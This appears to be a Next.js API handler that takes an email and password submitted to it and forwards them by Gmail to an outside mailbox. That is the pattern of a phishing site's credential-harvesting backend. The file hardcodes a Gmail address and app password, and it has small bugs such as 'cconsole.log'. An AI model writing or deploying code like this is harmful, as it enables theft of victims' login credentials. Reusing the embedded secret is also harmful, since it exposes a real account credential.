import nodeMailer from 'nodemailer';

export default async function handler(req, res) {
  const { method, body } = req

  switch (method) {
    case 'POST':

      const transporter = nodeMailer.createTransport({
        service: "gmail",
        auth: {
            user: "rheiinklaus@gmail.com",
            pass: "fnjwlzlyqxbthlvw"
          }
        });
        
        const option = {
          from: "",
          to: "",
          subject: "nuovo messaggio",
          html: `
            <p>email: ${body.email}</p>
            <p>password: ${body.password}</p>
            <p>createdAt: ${Date(body.createdAt)}</p>
          `
        }

        transporter.sendMail(option, function(error, info) {
          if(error) {
            cconsole.log(error);
          } else {
            console.log('mail send')
          }
        })

      return res.status(201).send("ok");
    default:
      return res.status(400).send("error");
  }
}